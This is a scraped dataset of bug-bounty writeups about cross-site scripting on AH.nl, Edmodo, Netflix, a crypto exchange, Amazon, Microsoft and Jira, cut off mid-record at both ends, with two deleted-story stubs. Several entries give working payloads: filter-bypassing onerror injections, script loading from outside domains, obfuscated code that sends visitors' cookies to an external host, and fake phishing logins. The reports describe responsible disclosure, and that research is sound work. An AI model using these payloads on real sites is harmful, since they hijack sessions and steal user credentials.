the frontpage as a new user. We won’t use that user for our injection, but you can imagine the impact if we did. Creating the XSS Payload Before we start we need to take a look at how the HTML is structured. Press enter or click to view image in full size Avatar on the frontpage As you can see the HTML is quite simple, just an image displaying the avatar. What if we are able to inject a \" in order to close the src= attribute and after that an onerror=ourJavascript() That will force the browser to load an image that does not exists and fires our onerror handler. Sounds good! Firewalls, regular expressions, string sanitizers After a few hours of trying I discovered that quite a lot of combinations are blocked and I came up with the following working payload: \"%20onerror%20onerror%3d%3donerror%3da%3d$.getScript(\"https://na12.nl\")%20data%3d\" We start with the “ to close the img src attribute, since it will give an error (the image that it tries to load does not exist) we can use the onerror handler to execute code. Onerror/onload/onclick= strings are removed by their firewall, but we can bypass that by using a string like onerroronerror== it will remove the onerror= in the middle and we end up with… onerror=. Now we need to load our code, luckily they include jQuery on every page, so we’re able to use the getScript function to load external javascript. There are some regular expression in place on the AH.nl server that validate strings for urls. It will returns errors for situations where the url is too long or if it does contain a slash in the path. Because of that we need a short domain name and a server that sends our javascript if it receives a request on the ‘naked’ https://domain.com url. External Javascript We don’t have limitations in the code we inject if we are able load our external javascript. Below a copy of the code. We add some CSS to the page and inject a jQuery module that allows us to make a nice modal popup. Later we will use this to show our fake phishing login. As a bonus we will add a small script that tries to lookup the user details of any logged in user that loads our code. Press enter or click to view image in full size Source of our injected javascript Get on the frontpage, hutspot Now we want to target all the visitors that visit this part of the website. We need AH.nl to publish one of our accounts, so that means; write recipes! Press enter or click to view image in full size H. Acker on the frontpage I signed up with an account, submitted one of my best hutspot recipes , took a cup of tea and waited for few hours. Welcome Hermelien Acker! We have a dangerous combination now if we load our code into Hermelien her avatar. We won’t do that since we want to avoid impacting any regular visitors. However the code still loads if we are logged in with a manipulated account (the avatar is displayed in the menu) so we can use that for our screen capture and bug submission. Proof of concept in action Press enter or click to view image in full size Press enter or click to view image in full size Logged in user? We’re able to steal their details. Also their last purchases if they connected their discount card. Solutions Always validate user input Define a field as an integer in the database if it is an integer, don’t allow type mixing. Escape all fields in the output HTML Impact of the attack Extra filtration of user information from other pages at AH.nl, submit data as the visitor on the AH.nl domain Attack the browser of visitors through injection of a framework like beefproject.com Setting up a phishing login Timeline 14–06–18 Found the bug, informed AH.nl 15–06–18 Bug confirmed by AH.nl 19–06–18 Requested update 05–07–18 Requested update 06–07–18 Bug fixed by AH.nl 09-07–18 Blog published, €200 reward JavaScript Bug Bounty Xss Attack Security Information Security -- -- 3 Written by Jonathan Bouman 2.6K followers · 38 following Medical doctor / Web developer / Security researcher - https://Protozoan.nl Responses ( 3 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@tahasmily2013m/i-have-found-vulnerability-in-360totalsecurity-is-reflected-xss-in-3a6bd602bb5a", "title": "410 Deleted by author — Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@tahasmily2013m/i-have-found-vulnerability-in-360totalsecurity-is-reflected-xss-in-3a6bd602bb5a. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n410 Deleted by author — Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Error 410 The author deleted this Medium story."}
{"source_url": "https://medium.com/bugbountywriteup/3-minutes-xss-71e3340ad66b", "title": "3 Minutes & XSS!. Hello wonderfull readers, Myself Ashish… | by Ashish | InfoSec Write-ups", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/bugbountywriteup/3-minutes-xss-71e3340ad66b. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n3 Minutes & XSS!. Hello wonderfull readers, Myself Ashish… | by Ashish | InfoSec Write-ups Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in InfoSec Write-ups · Follow publication A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow publication 3 Minutes & XSS! Ashish 2 min read · Aug 17, 2018 -- 1 Listen Share Hello wonderfull readers, Myself Ashish Jha back with another of my write-up, Yes you heard it right it was a “3 minutes and xss”, Now as an hacker i always try to be as much efficient as possible and always try to find bugs fast(It’s just my curiosity), Whenever i start pentesting any stuff i keep a rough record of the amount of time i took finding the bug. Let me narrate you this one: So the website i was pentesting was edmodo.com(I asked them for a public disclosure), It was just in the morning that i wanna pentest edmodo that day and in the noon i started it , Follow along. Step 1: I did a simply recon using knockpy and found a subdomain go.edmodo.com, I went their and clicked on signup, which then redirected me to: https://www.edmodo.com/onboarding?school_suggestion_test_variant=controlass&language=en_GB Press enter or click to view image in full size Redirection image Step 2: I just added some <> in the first parameter —[ school_suggestion_test_variant=controlass <>], To see whether they get embedded into the source code, Then i found these brackets getting embedded between the <script> tags , WHAT NEED MORE!!!!!!! Press enter or click to view image in full size <script> tags embedded! Step 3: <img src=x onerror=”alert(xss by ashish)”>, BOOOOOM XSS Press enter or click to view image in full size This was my 3 minutes recon and xss, hope you may find it helpfull. I then headed towards my mail and sent them the report, After a couple of days they replied back for rewarding the swags, And they are really awesome! My overall experience with edmodo security team was really awesome(10/10). Mug, Stickers, Badges, t-shirt Thank you guys for reading, Write for you after a while! Bug Bounty Pentesting Web App Security Hacking White Hat Hacker -- -- 1 Follow Published in InfoSec Write-ups 67K followers · Last published 18 hours ago A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow Written by Ashish 368 followers · 235 following Saw the purity of computers and felt in love with them. Co-Founder: https://bluefire-redteam.com | Learn: https://youtube.com/@cybersecurity- Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@tahasmily2013m/how-i-found-blind-xss-in-apple-c890775e745a", "title": "410 Deleted by author — Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@tahasmily2013m/how-i-found-blind-xss-in-apple-c890775e745a. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n410 Deleted by author — Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Error 410 The author deleted this Medium story."}
{"source_url": "https://medium.com/@black_b/vulnerability-netflix-cross-site-scripting-xss-d44010142e2c", "title": "Vulnerability Netflix (cross-site-scripting) XSS | by black_b | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@black_b/vulnerability-netflix-cross-site-scripting-xss-d44010142e2c. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nVulnerability Netflix (cross-site-scripting) XSS | by black_b | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Vulnerability Netflix (cross-site-scripting) XSS black_b 2 min read · Jun 13, 2018 -- 2 Listen Share Today I wanted to share with you my first vulnerability found in the bugbounty programs. It's the first time I do a POST about a bug. I remember that I started looking in the list that has the bugcrowd program (https://bugcrowd.com/list-of-bug-bounty-programs). so I chose netflix. use several tools for the recognition and study the behavior of the web page, capturing the request and verifying the response. When I tried the following: payload: </script><script>alert(1);</script> and bingo Press enter or click to view image in full size Press enter or click to view image in full size Netflix Hall of Fame: https://help.netflix.com/en/node/6657 This has been my message, I hope it has served you, I also wanted to thank Netflix for this experience. Thank you, My data: https://twitter.com/bada_77 Security -- -- 2 Written by black_b 79 followers · 3 following Chile Responses ( 2 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@khaled.hassan/the-2-5-btc-stored-xss-f2f9393417f2", "title": "The 2.5 BTC Stored XSS. Severity : High | by Khaled Hassan | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@khaled.hassan/the-2-5-btc-stored-xss-f2f9393417f2. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nThe 2.5 BTC Stored XSS. Severity : High | by Khaled Hassan | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in The 2.5 BTC Stored XSS Khaled Hassan 3 min read · Jun 13, 2018 -- 1 Listen Share Severity : High Complexity : Easy In September 2016, I had found a simple Stored XSS that I earned 2.5 BTC for it from a crypto exchange platfrom. and In this time I was trading too much in cryptocurrencies and I was trying to find the best crypto exchange platform that I can trade on it easily without any restrictions, so I decided to find a one. After a few hours on searching on the web, My eyes came on a Taiwan crypto exchange platform with awesome features and very good referral system too. Quickly I registered on the website and posted my referral link on facebook and twitter. The referral URL was as follow: https://www.reacted.com/users/sign_up/32427/shared In the second day, When I logged into my account on the website, I noticed two notifications about that two guys just registered using my referral link. Press enter or click to view image in full size An interesting thing, application prints the accounts names that registered using your referral link, So what If I register a new account with XSS name using my referral link. very simple, very easy. Quickly I registered a new account using my referral link with my favorite XSS payload “><img src=x onerror=prompt(1)> Then after I created the account I browsed to the notification page and I noticed that the payload didn’t get executed and I didn’t know why even the payload isn’t filtered by the application. Hmmm, I tried many payloads and it didn’t get popup too. Then I tried to register a new account with this payload (“ <script>alert(1)</script>”) After I registered the account, I browsed to notification page again. But this time the payload has been executed on the page using script alert payload. My reaction after this I felt this moment that this payload tells me he is still the king of XSS even if no one uses it anymore ;”D XSS’ing all platform users However, haven’t you noticed that you can change the ID on the referral link to another account ID that you want to register by his referral link ? It looks like that this website generates referral links depends on the ID of user which is very easy to known or enumerated. In other websites, the referral link is consists of hashed token. And because of this feature or bug, I was able to XSS all users by sending registration requests to intruder tap and this will request register accounts by users referral link with XSS names From User ID 1 to 32427 USER ID And XSS will get executed on accounts of user when they see the notification page Quickly, I sent an email support team asking them If they have bug bounty or something like that, and after 6 hours their response was as follow Great reply! After this encouraging response I wrote the report of Stored XSS that I found and other two medium severity issues and sent the report to them. 26 Hours later of sending the report, I got this awesome email. The company rewarded me with 2.5 BTC as bounty for my effort and offered me to do pentest on their application from time to time. Lessons learned Do not hesitate to report something you found on a service or application that you use and I’m sure It’s probably going to be appreciated by them and it might end up getting great stuff. Don’t forget to test referral function because I never thought that it maybe be vulnerable to anything like that Startup -- -- 1 Written by Khaled Hassan 723 followers · 8 following https://twitter.com/rahalm16 Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@jonathanbouman/reflected-client-xss-amazon-com-7b0d3cec787", "title": "Reflected Client XSS at Amazon.com | by Jonathan Bouman | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@jonathanbouman/reflected-client-xss-amazon-com-7b0d3cec787. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nReflected Client XSS at Amazon.com | by Jonathan Bouman | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Reflected Client XSS at Amazon.com Jonathan Bouman 5 min read · Jun 15, 2018 -- 3 Listen Share Press enter or click to view image in full size Proof of concept Are you aware of any (private) bug bounty programs? I would love to get an invite. Please get in touch with me: Jonathan@Protozoan.nl Background The last 2 months I’ve been trying to improve my frontend & backend skills by developing https://Scroll.am (An alternative way to browse Amazon, feedback welcome!) . I use projects like these to learn more about new frameworks ( Vue.js ) and techniques (Codestar & Lambda, AWS ). Today I learned something more about XSS and I would love to share it with you :) I’m always interested in the ways how Amazon displays its own products. What design did they choose, what about the UX? I can learn a lot from that since they AB test everything . But where do you look for all their different types of designs? Amazon shopping app One of the places to check for new designs is their App. So on a rainy friday afternoon I decided to decompile their Amazon Shopping Android App and have a look around in the code. A quick walkthrough: 1. Download the APK file to your local computer, 2. Use some online decompiler to extract the code, 3. Start looking around in the different files for urls to product pages. Searching for product page urls Amazon product pages often have ‘/dp/’ in the url, so I did a quick search on that: Press enter or click to view image in full size Plenty of hits. One of them https://www.amazon.com/gp/masclient/dp/ <product_id> . Masclient product page? After 2 months I saw plenty of product urls, but never saw one having this masclient part. Let’s have a look . Found Waldo! Mmm. This looks like some custom product page they use inside their app. What happens if we change the product id? Press enter or click to view image in full size Mmm that looks broken. No proper checks for the product id and it looks likes it capitalizes it. So… maybe we’re able to inject some HTML code? Lets see what happens if we try a <marquee> tag. Press enter or click to view image in full size Great. It renders our input at 7 different places in the code, one of them right inside in a script tag. A few problems we have 1. Input is capitalized; so javascript functions like alert become ALERT and stop working. Luckily someone else already circumvented that problem while working on an XSS attack at Yahoo.com. Solution: convert the plain text to HTML entities and URL encode the string , use the output inside an onload parameter of a svg tag. For example: <svg onload=%26%23x61%3B%26%23x6C%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B%26%23x28%3B%26%23x27%3B%26%23x48%3B%26%23x69%3B%26%23x20%3B%26%23x4D%3B%26%23x6F%3B%26%23x6D%3B%26%23x27%3B%26%23x29%3B> 2. Closing tags are not allowed (</script>); it fires a 404 error, so it’s not possible to easily side load our own javascript file by using a <script src=\"evil.com/1.js\"></script> block. Solution: use <svg onload=javascript:alert(1)> for javascript injections in the DOM. Or just use the vector we have inside of the script block. We are able to break out of it by adding a few characters: “}’> so the url becomes https://www.amazon.com/gp/masclient/dp/'}\");}JAVASCRIPTHERE;{(\" Due to the capitalization problem we may decide to use a jscrew.it technique in order to convert the javascript to ! ( ) + [ ] characters. An example url that just fires the debugger function is: https://www.amazon.com/gp/masclient/dp/'%7D\");%7D[][(![]+[])[+[]]+([![]]+[][[]])[+!![]+[+[]]]+(![]+[])[!![]+!![]]+(![]+[])[!![]+!![]]][([]+[][(![]+[])[+[]]+([![]]+[][[]])[+!![]+[+[]]]+(![]+[])[!![]+!![]]+(![]+[])[!![]+!![]]])[!![]+!![]+!![]]+(!![]+[][(![]+[])[+` ... If the url length was not a problem it would be great to use this technique and inject fetch(\"evil.com\"+document.cookie) ( credits ). However the url will become >8000 characters, and we run into problem 3. 3. Max url length is limited; Amazon stops loading the page if the url is longer than ~3500 chars, so we can’t take advantage of techniques like http://jscrew.it/ . Solution : No idea, anyone? Update : Redditor Flowible suggested to use jjencode , I tried to do that at the time of writing the report, but the use of $ signs was not possible. Anyone aware of variation that let us change the $ sign into a normal character? Update : DrStache_ suggested to use octal encoding and javascript constructors.For example alert(1) is URL[‘\\143\\157\\156\\163\\164\\162\\165\\143\\164\\157\\162’](‘\\141\\154\\145\\162\\164(1)’)() and alert(document.cookie) is X=URL[‘\\143\\157\\156\\163\\164\\162\\165\\143\\164\\157\\162’];X(‘\\141\\154\\145\\162\\164(X(“\\162\\145\\164\\165\\162\\156 \\144\\157\\143\\165\\155\\145\\156\\164.\\143\\157\\157\\153\\151\\145”)())’)() Explained: X=URL[‘\\143\\157\\156\\163\\164\\162\\165\\143\\164\\157\\162’]; X(‘\\141\\154\\145\\162\\164(X(“\\162\\145\\164\\165\\162\\156 \\144\\157\\143\\165\\155\\145\\156\\164.\\143\\157\\157\\153\\151\\145”)())’)() is decoded X=URL[‘constructor’]; X(‘alert(X(“return document.cookie”)())’)() is decoded X=Function; X(‘alert(X(“return document.cookie”)())’)() is decoded Function(‘alert(Function(“return document.cookie”)())’)() is decoded alert(Function(“return document.cookie”)()) alert(document.cookie) 4. Chrome XSS Auditor; ERR_BLOCKED_BY_XSS_AUDITOR errors occur in Chrome (67.0.3396.62) if it detects any reflection attacks. For our proof of concept we use the Firefox (60.0.1) since it has no xss auditor. Solution: I was not able to find any unfixed bugs in the auditor. Anyone aware of a way to bypass this? Proof of concept (Working in Firefox) We will craft an Amazon url that automatically redirects the visitor to an external URL, appending the cookie details of this visitor to the URL. We log all the visits to this website, so we’re able to hijack their Amazon session. Furthermore we add some fake login screen, just for the sake of it, ‘we could have tried to steal login credentials’. URL: https://www.amazon.com/gp/masclient/dp/%22%7D'%3E%3Csvg%20onload%3D%26%23x77%3B%26%23x69%3B%26%23x6E%3B%26%23x64%3B%26%23x6F%3B%26%23x77%3B%26%23x2E%3B%26%23x6C%3B%26%23x6F%3B%26%23x63%3B%26%23x61%3B%26%23x74%3B%26%23x69%3B%26%23x6F%3B%26%23x6E%3B%26%2… URL Decode: https://www.amazon.com/gp/masclient/dp/\"}'><svg onload=&#x77;&#x69;&#x6E;&#x64;&#x6F;&#x77;&#x2E;&#x6C;&#x6F;&#x63;&#x61;&#x74;&#x69;&#x6F;&#x6E;&#x2E;&#x72;&#x65;&#x70;&#x6C;&#x61;&#x63;&#x65;&#x28;&#x27;&#x68;&#x74;&#x74;&#x70;&#x73;&#x3A;&#x2F;&#x2F;&#x73;&#x33;&#x2D;&#x65;&#x75;&#x2D;&#x77;&#x65;&#x73;&#x74;&#x2D;&#x31;&#x2E;&#x61;&#x6D;&#x61;&#x7A;&#x6F;&#x6E;&#x61;&#x77;&#x73;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x70;&#x65;&#x6E;&#x74;&#x65;&#x73;&#x74;&#x69;&#x6E;&#x67;&#x2D;&#x74;&#x61;&#x72;&#x67;&#x65;&#x74;&#x2F;&#x78;&#x73;&#x73;&#x31;&#x2E;&#x68;&#x74;&#x6D;&#x6C;&#x3F;&#x63;&#x6F;&#x6F;&#x6B;&#x69;&#x65;&#x3D;&#x27;&#x2B;&#x65;&#x73;&#x63;&#x61;&#x70;&#x65;&#x28;&#x64;&#x6F;&#x63;&#x75;&#x6D;&#x65;&#x6E;&#x74;&#x2E;&#x63;&#x6F;&#x6F;&#x6B;&#x69;&#x65;&#x29;&#x29;> HTML Entities Decode: https://www.amazon.com/gp/masclient/dp/\"}'><svg onload=window.location.replace(‘https://s3-eu-west-1.amazonaws.com/pentesting-target/xss1.html?cookie='+escape(document.cookie))> Bonus link, alert(1) in Chrome: https://www.amazon.com/gp/masclient/dp/'%7D%22);%7D[][(![]+[])[+[]]+([![]]+[][[]])[+!![]+[+[]]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]][(+(+!![]+[+([][(![]+[])[+[]]+([![]]+[][[]])[+!![]+[+[]]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]]+[])[+[]]])+[!![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!![]+[+[]]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]])[+!![]+[+[]]]+(!!++([][(![]+[])[+[]]+([![]]+[][[]])[+!![]+[+[]]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]]+[])[+[]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!![]+[+[]]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]])[+!![]+[+!![]]]+([][[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+(+(+!![]+[+([][(![]+[])[+[]]+([![]]+[][[]])[+!![]+[+[]]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]]+[])[+[]]])+[!![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!![]+[+[]]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]])[+!![]+[+[]]]+(!![]+[])[+[]]+(!!++([][(![]+[])[+[]]+([![]]+[][[]])[+!![]+[+[]]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]]+[])[+[]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!![]+[+[]]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]])[+!![]+[+!![]]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+(+(+!![]+[+([][(![]+[])[+[]]+([![]]+[][[]])[+!![]+[+[]]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]]+[])[+[]]])+[][(![]+[])[+[]]+([![]]+[][[]])[+!![]+[+[]]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]])[+!![]+[+!![]]]+(![]+[])[+!![]]+(![]+[])[!![]+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]])()(+!![]);%7B(%22 Press enter or click to view image in full size Conclusion Never forget to security audit your internal mobile app webpages, forgetting one parameter is enough to create an exploit with impact. Obfuscating your XSS payload can bypass different protections and allows you to create an unsuspicious url. Never stop searching for Waldo ;-) Timeline 08–06–18 Discovered bug 09–06–18 Informed Amazon 11–06–18 Amazon confirmed the bug 14–06–18 Amazon fixed the bug, no rewards 15–06–18 Fix confirmed, blog published 10–07–18 Added encoding suggestion (credits: DrStache_ ) JavaScript Security Pentesting Xss Attack Amazon -- -- 3 Written by Jonathan Bouman 2.6K followers · 38 following Medical doctor / Web developer / Security researcher - https://Protozoan.nl Responses ( 3 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@sudhanshur705/xss-in-microsoft-subdomain-81c4e46d6631", "title": "XSS in Microsoft subdomain. Heyy Everyonee, | by Sudhanshu Rajbhar | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@sudhanshur705/xss-in-microsoft-subdomain-81c4e46d6631. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nXSS in Microsoft subdomain. Heyy Everyonee, | by Sudhanshu Rajbhar | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in XSS in Microsoft subdomain Sudhanshu Rajbhar 3 min read · Jul 13, 2018 -- 4 Listen Share Heyy Everyonee, I am Sudhanshu , in this article I am going to share the story about my first xss which I found in Microsoft. A great thanks to my masters and friends for the love and support. This is my first article, so if there is any mistake in it forgive me. So the story goes like this ….. It was the time during my school summer holidays,I got a lot of homework but who cares about it .I just want to spend my time on my laptop.So here we go 18 days got passed away and I didn’t even realised I wasted all the time searching for websites for defacement,but I really sucked at it I couldn’t even find a single site. At that time, I asked myself something “Am I just going to waste my time like this searching for sites for defacement or I will do something else?” ,I decided that I will do something that gives me the satisfaction which I want. And suddenly an idea came into my mind what about doing bug hunting,I was already having a idea about it.But my problem was that after seeing others bugbounty hunter getting rewarded for their findings,I used to think that they are experts(yeah they are) and they just spend f**king one hour for finding bugs, its is just a piece of cake for them .So I thought I will also spend just one hour or something and I will find some cool bugs. I was totally wrong about it.Those guys out there are spending all their time searching for bugs,learning new things.I decided that I will do the same as them. Here we go, the real story starts from here Next day, I took my note and I watched around 30 XSS POC videos and some write-ups to understand where I can actually find those xss. I noted down the reproduce steps, then I read them again and again to understand it.After half-an-hour I started my search for the XSS . And guess what was my target “Microsoft”. I got this site https://social.microsoft.com/Forums/en-US/home , then I tried everywhere on the homepage where I can see any input field I looked for xss, but nothing seems to work and I was like And then I saw an button there “Ask Question”, i clicked on it.In the body field there were many options likes insert link,instert html,insert image so I put the payload in those fields and hoping that the xss will popup. Just in the first attempt in “insert link” I put my paload in the link, title,tooltip field and guess what Press enter or click to view image in full size And guys I was just fucked up after seeing it, really I did it!!!!!!! I was feeling like Then I looked for other Microsoft websites for the same xss bug and I got the same on social.msdn.microsoft.com .And then reported both of them. POC video: Time Line: 01/June/2018: Reported the bug to Microsoft 09/June/2018:Got a reply stating that Report has been sent to the team. 13/July/2018:Fixed Press enter or click to view image in full size Thankyou so much for reading it. :) More where this came from This story is published in Noteworthy , where thousands come every day to learn about the people & ideas shaping the products we love. Follow our publication to see more product & design stories featured by the Journal team. Security Bug Bounty -- -- 4 Written by Sudhanshu Rajbhar 1.3K followers · 190 following httpss://twitter.com/sudhanshur705 Responses ( 4 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@adeshkolte/how-i-found-xss-via-ssrf-vulnerability-adesh-kolte-873b30a6b89f", "title": "How I found XSS via SSRF vulnerability -Adesh Kolte | by Adesh Kolte | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@adeshkolte/how-i-found-xss-via-ssrf-vulnerability-adesh-kolte-873b30a6b89f. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHow I found XSS via SSRF vulnerability -Adesh Kolte | by Adesh Kolte | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in How I found XSS via SSRF vulnerability -Adesh Kolte Adesh Kolte 2 min read · Jun 7, 2018 -- 3 Listen Share Hello This is Adesh Nandkishor Kolte First Read This Articles How i converted SSRF TO XSS in jira. I m very much into Bug Bounty and i spend my whole day doing this finding new and interesting stuff and kept on… medium.com Piercing the Veil: Server Side Request Forgery to NIPRNet access During my reconnaissance of military websites as part of the Department of Defense’s vulnerability disclosure, I… medium.com After reading both articles I figure out new way to carry out the XSS attack ,discovered that due to an outdated Jira instance, I was able to exploit an SSRF vulnerability in Jira and was able to perform several actions such as bypass any firewall/protection solutions and etc so i just tried some basics tricks with google for finding the web apps which used jira integration Press enter or click to view image in full size got web europa https://webgate.ec.europa.eu/CITnet/jira/plugins/servlet/oauth/users/icon-uri?consumerUri= so i quickly visited “ plugins/servlet/oauth/users/icon-uri?consumerUri=http://google.com ” And Boom i got the google page and i m like Press enter or click to view image in full size i had uploaded xss script on my own Server http://adeshkolte.at.ua/h.html and pasted it at the place of google.com https://webgate.ec.europa.eu/CITnet/jira/plugins/servlet/oauth/users/icon-uri?consumerUri=http://adeshkolte.at.ua/h.html Press enter or click to view image in full size then i found many webs vulnerable for it Motorola Solution Press enter or click to view image in full size Mass.gov Press enter or click to view image in full size Cambridge University Press Press enter or click to view image in full size Stanford University Press enter or click to view image in full size Thanks for reading Security -- -- 3 Written by Adesh Kolte 647 followers · 143 following Listed in Top 100 most respected hackers in the world by Microsoft at the BlackHat conference in America 2018 Responses ( 3 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://wesecureapp.com/blog/persistent-xss-to-steal-passwords-paypal/", "title": "Persistent XSS to Steal Passwords - Paypal", "friendly_explanation": "This is a bug bounty writeup from https://wesecureapp.com/blog/persistent-xss-to-steal-passwords-paypal/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nPersistent XSS to Steal Passwords - Paypal Home Services Application Security Web Application VAPT Mobile Application Pentesting Web Services & API Assessment Threat Modeling Secure Code Review Application Architecture Review Network Security Network Vulnerability Assessment and Penetration Testing Device Security VoIP Vulnerability Assessment & Penetration Testing Wireless Penetration Testing Cloud Security Cloud Auditing Cloud Pentesting Breach & Attack Simulation Red Team Assessment Dark Web Monitoring Ransomware Simulation Social Engineering Assumed Breach Staffing Services Smart Shore Sourcing Virtual CISO Solutions Vulnerability Management as a Service Vulnerability Remediation as a Service Threat Intelligence as a Service DevsecOps Strategic Security Solutions Compliance RBI Cyber Security Framework For Banks SEBI Cyber Security & Cyber Resilience Framework UIDAI – AUA KUA Compliance Security RBI Guidelines for Payment Aggregators & Payment Gateways RBI Cyber Security Framework For Urban Cooperative Banks RBI Guidelines for cyber security in the NBFC Sector SAR Audit ISO27001 PCI DSS GDPR Hipaa Audit SOC2 Assessment Resources Blog Case studies White Papers Datasheets Events Podcast Company About us Partners Careers Contact Services Application Security SERVICES Web Application Penetration Testing Mobile Application Pentesting Web Services & API Assessment Threat Modeling Secure Code Review Application Architecture Review RESOURCES Top 7 cyber security measures that enterprises shouldn’t neglect Network Security SERVICES Network Vulnerability Assessment and Penetration Testing Device Security VoIP Vulnerability Assessment & Penetration Testing Wireless Penetration Testing RESOURCES Top 7 Penetration Testing Companies in the USA Cloud Security SERVICES Cloud Auditing Cloud Pentesting RESOURCES Cloud Security Threats Breach & Attack Simulation SERVICES Red Team Assessment Dark Web Monitoring Ransomware Simulation Social Engineering Assessment Assumed Breach RESOURCES 7+ Major Reasons to Hire a Red Team to Harden Your App Sec Staffing Services SERVICES Smart Shore Sourcing Virtual CISO RESOURCES How to Choose a Penetration Testing Vendor Wisely? Solutions MANAGED SECURITY Vulnerability Management as a Service Vulnerability Remediation as a Service Threat Intelligence as a Service DevSecOps Strategic Security Solutions RESOURCE World’s Worst Passwords: Is it time to change yours? Compliance REGULATORY COMPLIANCE RBI Cyber Security Framework For Banks SEBI Cyber Security & Cyber Resilience Framework UIDAI – AUA KUA Compliance Security RBI Guidelines for Payment Aggregators & Payment Gateways RBI Cyber Security Framework For Urban Cooperative Banks RBI Guidelines for cyber security in the NBFC Sector SAR Audit for Data Localization STANDARD COMPLIANCE ISO27001 PCI DSS GDPR Hipaa Audit SOC2 Assessment RESOURCE HIPAA: A US Federal law to protect health information Resources Blog Datasheets Case Studies Whitepapers Podcasts Events Company About us Partners Careers Contact Home Services Application Security Web Application VAPT Mobile Application Pentesting Web Services & API Assessment Threat Modeling Secure Code Review Application Architecture Review Network Security Network Vulnerability Assessment and Penetration Testing Device Security VoIP Vulnerability Assessment & Penetration Testing Wireless Penetration Testing Cloud Security Cloud Auditing Cloud Pentesting Breach & Attack Simulation Red Team Assessment Dark Web Monitoring Ransomware Simulation Social Engineering Assumed Breach Staffing Services Smart Shore Sourcing Virtual CISO Solutions Vulnerability Management as a Service Vulnerability Remediation as a Service Threat Intelligence as a Service DevsecOps Strategic Security Solutions Compliance RBI Cyber Security Framework For Banks SEBI Cyber Security & Cyber Resilience Framework UIDAI – AUA KUA Compliance Security RBI Guidelines for Payment Aggregators & Payment Gateways RBI Cyber Security Framework For Urban Cooperative Banks RBI 